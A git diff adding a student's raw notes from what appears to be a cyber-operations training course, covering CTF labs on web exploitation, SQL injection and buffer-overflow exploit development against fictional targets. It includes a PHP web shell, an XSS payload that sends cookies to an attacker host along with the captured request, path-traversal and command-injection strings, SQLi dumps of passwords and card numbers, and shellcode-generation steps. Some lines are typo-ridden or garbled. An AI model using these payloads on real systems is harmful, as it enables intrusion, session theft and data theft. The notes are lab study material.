@@ -88,4 +88,743 @@ student@grey-site-donovia-09:~$
 64 bytes from 192.168.150.225: icmp_seq=1 ttl=64 time=0.343 ms
 64 bytes from 192.168.150.253: icmp_seq=1 ttl=63 time=1.42 ms
 
+_____Web Exploitation_____
+response codes 
+1xx info
+2xx success
+3xx redirection
+4xx client error
+5xx server error
+
+Javascript Interaction
+<script>
+function myFunction () {
+	document.getElementById("demo").innerHTML = "Paragraph changed.";
+}
+</script>
+
+<script src="http://www.w3schools./com/js/myScript.js"</script>>
+
+_____Enumeration_____
+robots.txt
+legit surfing
+tools: NSE scripts, nikto, burp suite
+
+student@lin-ops:~$ nmap 10.50.29.52 --script http-enum -p 80
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2023-07-17 13:38 UTC
+Nmap scan report for 10.50.29.52
+Host is up (0.0044s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /java/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /path/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds
+
+_____XSS_____
+Reflected - most common
+	<script>alert('XSS');</script>
+Stored - more dangerous
+http://10.100.28.40/uploads/message
+_____Server-Side Injection_____
+Directory/Path Traversal
+cat /home/student/../../../../../../../../etc/passwd
+
+_____Malicious File Upload_____
+nano mal.php
+
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+
+_____Command Injection_____
+*start the injection with ";"
+system("ping -c 1 ".$_GET["ip"]);
+
+_____CTFds_____
+
+Nmap scan report for 10.100.28.40
+Host is up (0.0044s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+10.100.28.55
+
+
+
+billybob billybob
+
+total 12 drwxr-xr-x 2 root root 4096 Apr 19 2022 . drwxr-xr-x 7 root root 4096 Apr 19 2022 .. -rw-r--r-- 1 root root 1581 Mar 23 2022 industry_check.php -rw-r--r-- 1 root root 1581 Mar 23 2022 industry_check.php
+
+cat /etc/passwd
+<p>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologini syntax
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+billybob:x:1001:1001:you found me qOb0DcnPfmMPe2NQ9A2J:/home/billybob:/bin/bash
+billybob:x:1001:1001:you found me qOb0DcnPfmMPe2NQ9A2J:/home/billybob:/bin/bash</p>
+et_test/industry_check.php?IP=&Path=%3Bls+-la+%2Fhome%2Froman*%2Fcont*&Stat=
+pwd
+
+
+/var/www/html/net_test /var/www/html/net_test
+
+la -la /home
+
+total 20 drwxr-xr-x 5 root root 4096 Apr 19 2022 . drwxr-xr-x 23 root root 4096 Jul 13 16:27 .. drwxr-xr-x 2 billybob billybob 4096 Apr 19 2022 billybob drwxr-xr-x 2 root root 4096 Apr 19 2022 romanoff@mi.ru drwxr-xr-x 3 ubuntu ubuntu 4096 Apr 19 2022 ubuntu drwxr-xr-x 3 ubuntu ubuntu 4096 Apr 19 2022 ubuntu
+
+cat contracts 
+
+
+2HCcY0w4unRRgqtkwbq5 2HCcY0w4unRRgqtkwbq5
+
+student@lin-ops:~$ proxychains  ssh -i home/student/.ssh/id_rsa.pub billybob@10.100.28.40 -p 4444
+or
+student@lin-ops:~$ proxychains ssh billybob@10.100.28.40 -p 4444
+
+
+Admin
+<script>document.location="http://10.50.30.139:4567/Cookie_Stealer1.php?username=" + document.cookie;</script>
+
+
+Connection from 10.50.38.232 56941 received!
+Connection from 10.50.39.253 28944 received!
+GET /Cookie_Stealer1.php?username=COOKIE=m8pGSa35V7JSyNbrhKok;%20PHPSESSID=sqft2iq4chcdolsl2gos9sc9l2 HTTP/1.1
+Host: 10.50.30.139:4567
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://10.100.28.40/
+Upgrade-Insecure-Requests: 1
+
+view-source:http://10.100.28.55/books_pick.php?book=../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+3VkiOcjQTBiqKgksrRc9
+
+_____SQL Injection_____
+
+Standard Commands
+SELECT - Extracts data from a database
+UNION - Used to combine the result-set of two or more SELECT statements
+USE Selects the DB to use
+UPDATE - Updates data in a database
+DELETE - Deletes data from a database
+INSERT INTO - Inserts new data into a database
+CREATE DATABASE - Creates a new database
+ALTER DATABASE - Modifies a database
+CREATE TABLE - Creates a new table
+ALTER TABLE - Modifies a table
+DROP TABLE - Deletes a table
+CREATE INDEX - Creates an index (search key)
+DROP INDEX - Deletes an index
+
+demo box
+10.50.29.175
+cd /var/www/html
+ls -la
+cat login.php (will have mysqli_connect localhost:3306, webuser, sqlpass) creds internal to DB (not cred to log in across the network)
+
+MariaDB
+on DB
+terminate query with ";"
+ex: show databases; (not 'show databases')
+show tables;
+select * from Tires;
+select name, cost from Tires;
+select name, cost from session.Tires; (if you can't change the session prior to query)
+select tireid, name, size, cost from session.Tires where tireid=3;
+select * from session.Tires where tireid=3; (this won't help because you need to know the exact columns for injections)
+select database()
+select database(), @@version, select load_file ("/etc/passwd")
+select tireid, name , size, cost from session.Tires UNION SELECT * from session.user; (error: the uses SEELECT have a different number of columns)
+select name , size, cost from session.Tires UNION SELECT * from session.user; (we have to know what the columbs are to make sense of the output)
+select table_schema, table_name, column_name from information_schema.columns; (messy output in terminal, this shows the "shape" of the database)(called a 'golden statement')
+
+SQLBOLT
+https://sqlbolt.com/
+SELECT * FROM Movies where Title LIKE "Toy%";
+SELECT Distinct Director FROM movies ORDER BY Director ASC;
+SELECT * FROM movies order by year desc limit 4;
+SELECT * FROM movies order by title asc limit 5;
+SELECT * FROM movies order by title asc limit 5 offset 5;
+SELECT * FROM north_american_cities where Country = "Canada";
+SELECT * FROM north_american_cities where country = "United States" order by Latitude desc;
+List all the cities west of Chicago, ordered from west to east 
+SELECT * FROM north_american_cities where Longitude < -87.629798 order by Longitude ASC;
+List the two largest cities in Mexico (by population)
+SELECT * FROM north_american_cities where country = "Mexico" order by Population desc limit 2;
+List the third and fourth largest cities (by population) in the United States and their 
+SELECT * FROM north_american_cities where Country = "United States" order by Population DESC limit 2 offset 2;
+Find the domestic and international sales for each movie
+SELECT Title, Domestic_sales, International_sales FROM movies inner join Boxoffice on Movies.id = Boxoffice.Movie_id;
+Show the sales numbers for each movie that did better internationally rather than domestically 
+SELECT Title, Domestic_sales, International_sales FROM movies inner join Boxoffice on Movies.id = Boxoffice.Movie_id where International_sales > Domestic_sales;
+List all the movies by their ratings in descending order 
+SELECT * FROM movies inner join Boxoffice on Movies.id = Boxoffice.Movie_id order by Rating Desc;
+Find the list of all buildings that have employees
+SELECT distinct building FROM employees;
+Find the list of all buildings and their capacity
+SELECT * FROM buildings;
+List all buildings and the distinct employee roles in each building (including empty buildings)
+SELECT DISTINCT building_name, role FROM buildings LEFT JOIN employees ON building_name = building;
+
+Injection Considerations
+valid queries
+fully patched systems can be vulnerable due to misconfiguration
+inputfield sanitization (want to get around this)
+string vs integer values
+is INFORMATION_SCHEM Database available?
+GET requests versus POST request HTTP Methods
+Unsanitized input fields can be found using a single quote ' 
+ex
+before input:
+SELECT id FROM user WHERE name='$name' AND pass='$pass';
+after input 
+SELECT id FROM user WHERE name='JohnDoe243' AND pass='pass1234';
+to inject and break out of first quote
+user enters TOM'OR 1='1 in the name and pass fieds
+Truth Statement: tom ' OR 1='1
+Inspect - network - post request - "raw" - add variable to url to send get request
+http://10.50.29.175/login.php?username=tom%27OR+1%3D%271&passwd=tom%27OR+1%3D%271
+Array ( [0] => Luke_Skywalker [name] => Luke_Skywalker [1] => Jedi [pass] => Jedi ) 1Array ( [0] => Darth_Vader [name] => Darth_Vader [1] => Sith [pass] => Sith ) 1Array ( [0] => c3p0 [name] => c3p0 [1] => annoying [pass] => annoying ) 1Array ( [0] => Batman [name] => Batman [1] => BWyane [pass] => BWyane ) 1
+or
+in the inspector, change the "POST" to "GET"
+
+Stacking Statements
+chaining multiple statements together using a semi-colon
+Select * From user Where id = 'Johnny'; Drop TABLE Customers; --
+
+nesting stateements
+some web apploications + sql DB combos do not allow stacking, such as php and mysql.
+need to use nesting
+php?key=<value> UNION SELECT 1, column_name, 3 from information_schema.comlumbs where table_name = 'members'
+
+Ignore the rest
+using # or -- tells teh DB to ignore everything after
+server-side query: SELECT prodyct From item WHERE id = $select limit1;
+input to inject:
+1 OR 1=1;#
+server side query becomes:
+SELECT product FROM item WHERE id = 1 or 1=1; #limit 1;
+
+http://10.50.29.175/Union.html
+"in the box" Honda
+select name, type, cost, color, year from car where name='Honda'
+"in the box" Audi' or 1='1a
+or
+http://10.50.29.175/uniondemo.php?Selection=4%20or%201=1
+This is "blind injection"
+Need to add union selection
+"in the box"
+Audi' union select 1,2,3,4,5;#
+Audi' union select 1,2,3,4,@@version;#
+
+Abust the Client
+Id the schema leads to detailed queries to enumerate the DB
+Research SB schemas and what info they provide
+php?item=4 UNION SELECT 1, table_name, 3 from information_schema.tables where table_schema=database()
+
+Golden Statement
+example: Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+explanation:
+table_schema, = a column that contains the names of the databases
+table_name, = a column that contains the names of all the tables
+column_name = a column that contains the names of the columns on the server 
+FROM 
+information_schema. = a default database that contains information about the databases
+columns; = a table that contains information about the databases on the server
+#
+user created data will likely be at the top or the bottom
+
+example: Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+Audi' UNION SELECT 1,2,3,name,pass FROM session.user; #
+
+____SQL Injection CTFds_____
+Donovian Database Exploitation (DWDBE)
+XX Dec 2026
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver through network, identify and gather intelligence from the Donovian Logistics Agency database.
+
+Tools/Techniques: All connections will be established through web browser to donovian-nla. SSH masquerade to Donovian_Webserver with provide credentials. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques are limited to SQLi injections. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = 5QL1nj3ct5t@rt0F@ct1v1ty
+
+Prior Approvals: SQLi injects through web browser. Creation of database administrator account if directed to. Any connection to donovian-nla other than HTTP/HTTPs is NOT approved.
+
+Scheme of Maneuver:
+>Jump Box
+->T1:10.100.28.48
+
+Target Section:
+
+T1
+Hostname: donovian-nla
+IP: 10.100.28.48
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+Last Known HTTP Port: 80
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+
+SELECT first_name, last_name, permission FROM members WHERE username='administrator' union select 1,2,3;#' AND password='' 
+categories
+modify url 1 or 1=1
+tables
+case' union select table_schema,table_name FROM information_schema.columns;#
+sqlinjection	categories
+sqlinjection	members
+sqlinjection	orderlines
+sqlinjection	orders
+sqlinjection	payments
+sqlinjection	permissions
+sqlinjection	products
+sqlinjection	share4
+
+search
+ram' union select table_name, column_name from information_schema.columns;#
+categories	id
+categories	name
+categories	description
+members	id
+members	username
+members	password
+members	first_name
+members	last_name
+members	email
+members	permission
+orderlines	id
+orderlines	quantity
+orderlines	product
+orderlines	order
+orders	id
+orders	date
+orders	member
+payments	id
+payments	creditcard_number
+payments	date
+payments	order
+permissions	id
+permissions	level
+permissions	name
+permissions	description
+products	idram' OR 1='1
+products	name
+products	description ram' union select comment,mime from sqlinjection.share4;#
+products	price
+products	qty_left
+products	category
+share4	id
+share4	comment
+share4	mime
+share4	datacategories	id
+categories	name
+categories	description
+members	id
+members	username
+members	password
+members	first_name
+members	last_name
+members	email
+members	permission
+orderlines	id
+orderlines	quantity
+orderlines	product
+orderlines	order
+orders	id
+orders	date
+orders	member
+payments	id
+payments	creditcard_number
+payments	date
+payments	order
+permissions	id
+permissions	level
+permissions	name
+permissions	description
+products	id
+products	name
+products	description
+products	price
+products	qty_left
+products	category
+share4	id
+share4	comment
+share4	mime
+share4	data
+
+ram' union select username,password from sqlinjection.members;#
+Name	Description
+Boss		ay1y5th8igbtlOzp5GYm
+Maverick	turn&burn
+phreak		pwd
+Susan		flowers99
+TW		imAPlaya
+1-2-3-4		sayULuvM3
+rich_kid	1M$
+p0pStar		thrillaa
+Joe		vatoion 1,2 from sqlinjection.permissions;#
+	flag
+
+ram' union select name, description from sqlinjection.products;#
+SC-012-SILVER	Entry level sound card
+SC-019-GOLD	Great price/quality sound card
+SC-093-ULTIMATE	High performance sound card
+VC-033-SILVER	Entry level video card
+VC-078-GOLD	Great price/quality video card
+VC-096-ULTIMATE	flag: { NMYnmhTZPZfswGd9qu5l }10.1.48-MariaDB
+
+ram' union select id, creditcard_number from sqlinjection.payments;#
+8	0000 0000 0000 0000 0000 0000
+9	5547 3289 4658 4612 6871 8214
+10	7174 0074 1729 5710 1772 3356
+11	>>>> tDQoLmnbrqcILAKOZp3p <<<<
+12	4198 1744 6124 0918 7971 2331
+13	2147 9852 4672 1484 8854 3745
+
+ram' union select 1,@@version;#INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('e', 'e', 'e', 'e', 'e', 3)
+10.1.48-MariaDB
+
+ram' union select id,description from sqlinjection.permissions;#
+Name	Description4nGfU87s2V
+1	WOAH! flag: { SQLi_B4D_A55 }
+2	Classic member
+3	New member (no access)
+4	Banned member
+
+
+ram' union select comment,mime from sqlinjection.share4;#
+Name	Description
+You need to extract file from @@database.	compressed/zip
+Keys to the Kingdom	base64
+
+{ 4nGfU	4
+
+{ 4nGfU87s2V }
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('e', 'e', 'e', 'e', 'e', 3)
+NMYnmhTZPZfswGd9qu5l
+
+Hacker
+Hackerton
+HackerBoi420
+password
+Hackey.Hackerton@email.mail
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'd', 'd', 'd', 'd', '1') 
+
+admin
+Boss
+
+SELECT first_name, last_name, username, password, email, permission FROM members
+ WHERE email = 'x';
+        INSERT INTO members ('first_name','last_name','username','password','email','permission') VALUES ('Hacker','d','d','d','d','1');--
+
+SET permission = "1" WHERE username = "a";
+
+ram' OR 1='1
+
+ram' union select username,permission from sqlinjection.members;#
+
+hey','yo','hey@yo',1)#
+Hacker
+bD9v3GGF1eMfVKEJPzzH
+
+_____Reverse Engineering_____
+%rax the first return register. 
+	when leaving a function, the status will be sent here, ex: return 0 = sucess, 1 = fail
+%rbp the base pointer that keeps track of the base of the stack
+%rsp the stack pointer that points to the top of the stack
+
+Will see arguemnts passed to functions  like: [%ebp-0x8] (base pointer - 8)
+
+General Registers
+X86_64 uses 16 general registers, however it can access smaller bit registers for 32, 16, and 8 bits.
+• Accumulator register (AX) used for arithmetic operations
+• Counter register (CX). Used ifor shift instructions and loops.
+• Data register (DX). Used in arithmetic operations and I/O operations.
+• Base register (BX). Used as a pointer to data
+• Stack Pointer register (SP). Pointer for the top of the stack.
+• Stack Base Pointer register (BP). pointer for base of the stack.
+• Source Index register (SI). pointer to a source in stream operations.
+• Destination Index register (DI). pointer to a destination in stream operations.
+
+Heap - Memory that can be allocated and deallocated, optional
+Stack - a contiguous section of memory used for passing arguements, not optional
+General Register - A multipurpose register that can be used by ether programmer or user to store data or a memory location address
+Control Register - A processor register that changes or controls the behavior of a CPU, pause data flow to listen to hardware for a moment
+Flags Register - Contains the current state of the processor
+
+
+
+Gorgas Reverse Engineering (GRE)
+XX Sep 2025
+Start Time: 1300
+Duration: 4 hours
+Type of Operation: DEVOPS
+Objective: Intel has identified that the Donovian_Webserver (192.168.28.111) is hosting binaries via port 80 at the following URI /longTermStorage. We have been tasked with pulling the binaries back into blue space to conduct Reverse Enineering operations. Conduct Reverse Engineering (disassemble, debug) on collected files, determine functionality and methods to successfully execute files.
+Tools/Techniques: Ghidra, IDA, and GDB.
+Scenario Credentials: FLAG = R3V3R535t@rt0F@ct1v1ty
+Prior Approvals:All files can be extracted from the known target "Donovian-Webserver". Only authorized to conduct task on Analyst Workstations.
+T1
+Hostname: web.site.donovia
+IP: 192.168.28.111
+OS: unknown
+Creds: comrade::StudentWebExploitPassword
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Extract approved binaries under directory titled "longTermStorage".
+
+RAX/EAX
+What is %RAX and %EAX main purpose?
+Their purpose is to hold the memory address of the top of the stack
+%RAX/%EAX are not valid x86-64 registers
+They are the first return registers for x86-64 and x86
+These registers act as breakpoints when debugging a process
+
+
+Windows Ops station (Remina works too)
+xfreerdp /v:10.50.xx.xx /u:student /size:1920x960 +clipboard
+
+_____Static Analysis______
+look at the code in notepad, check for human-readable strings
+header should have a plain-text file-type, ex; ELF - Executable and Linkable Format (Linux Executable)
+MZ: (Windows Executable) 
+Try to use strings command to dump strings
+Try to open the executale and see what happens
+	does running the command create any new files?
+
+_____Behavior Analysis_____
+
+
+
+_____Exploit Development_____
+-Buffer Overflow
+Heap - memory that can be allocated and deallocated
+Stack - a contiguous section of memory used for memory usage for passing arguements 
+Registers - storage elements as close as possible to the centeral processing unit
+Instruction Pointer (IP) - aka program counter (PC) contains the addres of the next instruction to be executed
+StackPointer (SP) - contains address of the next available space on the stack
+Base Pointer (BP) - base of stack
+Function - code separate from main program often used to replace code that repeats in order to make the program smaller and more efficient
+Shellcode - Code executed once an exploit successfully takes advantage of a vulnerability
+
+-BO Defenses
+Non executable stack NX
+Address space layout randomization ASLR
+data execution prevention DEP
+Stack Canaries
+Position Independent Executable PIE
+
+Tools
+IDA GHIDRA
+GDB, MONA, IMMUNITY
+
+GDB Uses
+git clone https://github.com/longld/peda.git ~/peda
+escho "source ~/peda/peda.py >> ~/.gdbinit
+commands
+disass <FUNCTION> # dissassemble portion of the program
+info <...> # supply info for specific stack areas
+x/256c $<REGISTER # Read characters from specific register
+break <address> # Establish a break point
+
+gdb func
+pdisass main
+  0x00000568 <+27>:	call   0x577 <getuserinput>
+pdisass getuserinput
+(look for red functions)
+0x000005a2 <+43>:	call   0x3d0 <gets@plt>
+r (runtime) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (bunch of As)
+Program received signal SIGSEGV, Segmentation fault.
+THis means that we crashed the thing
+EBX: 0x41414141 ('AAAA')
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+do r and a bunch of As
+Enter a string
+use the thing from wiremask
+get the new code
+0x31634130 in ?? ()
+put this in wiremask and get a position (62)
+student@lin-ops:~$ env - gdb func (used to clear env variables)
+show env
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+r
+bunch of As to crash it
+(gdb) info proc map
+grap addresses between heap and stack
+	0x56558000 0x5657a000    0x22000        0x0 [heap]
+	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
+	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fb7000 0xf7fba000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xef (1st address last address jump esp)
+
+grab some addresses 0xf7f78a5f
+0xf7f8b3fb
+0xf7fa1f73
+0xf7fac22f
+
+adjust the buffer =
+0xf7f8b3fb becomes fbb3f8f7
+
+change EIP to '\x90'
+
+msf
+use payload/linux/x86/exec
+show options
+set variable
+set CMD whoami
+msf6 payload(linux/x86/exec) > generate -b "\x00\x20\x0a\x0d" -f python
+copy the output into your .py file
+student guide ctrl f <<<
+
+(from the student guide)
+run <<< $(python demo_attack.py)
+Starting program: /demo/func <<< $(python /tmp/exploit.py)
+Enter a string:
+
+on my machine
+student@lin-ops:~$ sudo ./func <<< $(python /home/student/temp.py)
+
+
+_____Exploit Development CTF_____
+
+
+Scp the file from the target location to your linops box
+gdb inventory.exe
+pdisass main
+   0x0804855e <+27>:	call   0x80484d6 <getTheGoods>
+pdisass getTheGoods
+   0x080484f2 <+28>:	call   0x8048360 <printf@plt> (red)
+  0x0804850f <+57>:	call   0x8048370 <fgets@plt> (red)
+
+0x804b000  0x806d000    0x22000        0x0 [heap]
+	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
+	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fc4000 0xf7fc5000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fc5000 0xf7fc8000     0x3000        0x0 
+	0xf7fcf000 0xf7fd1000     0x2000        0x0 
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+
+find /b 0xf7def000, 0xf7ffe000, 0xff, 0xe4
+
+
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+
+
+
+
+
+
+
+
+
+
+
+
 
